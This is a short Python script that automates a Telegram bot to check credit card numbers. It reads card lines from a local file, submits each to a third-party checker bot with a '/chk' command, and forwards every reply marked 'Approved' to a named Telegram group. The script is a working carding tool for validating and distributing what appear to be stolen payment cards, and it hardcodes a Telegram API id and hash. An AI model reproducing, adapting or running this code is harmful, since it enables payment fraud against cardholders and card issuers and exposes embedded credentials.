import asyncio
from telethon.sync import TelegramClient, events

api_id = 29335915
api_hash = '9961ef035921a2087b0ff8070fda6e12'
done = 0
total_cc_count = sum(1 for line in open('cc.txt'))
txt = ''

client = TelegramClient('session_name', api_id, api_hash)
client.start()


group_username = '@ravencc23'

approved_keywords = {'𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅'}

async def send_message_to_bot(cc):
    await client.send_message('SDBB_Bot', f'/chk {cc}')

async def forward_to_group(message):
    await client.send_message(group_username, message)

@client.on(events.NewMessage(from_users='SDBB_Bot'))
@client.on(events.MessageEdited(from_users='SDBB_Bot'))
async def handle_message(event):
    global done
    global txt
    txt = event.message.text
    if 'wait' in event.message.text or 'Waiting' in event.message.text:
        return

    done += 1
    message = event.message.text.replace("`", "")

    
    if any(keyword in message.lower() for keyword in approved_keywords):
        print(message)
        await forward_to_group(message) 

    if done == total_cc_count:
        client.disconnect()

async def main():
    with open('cc.txt', 'r') as file:
        for line in file:
            cc = line.strip()
            await send_message_to_bot(cc)
            await asyncio.sleep(100)

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()
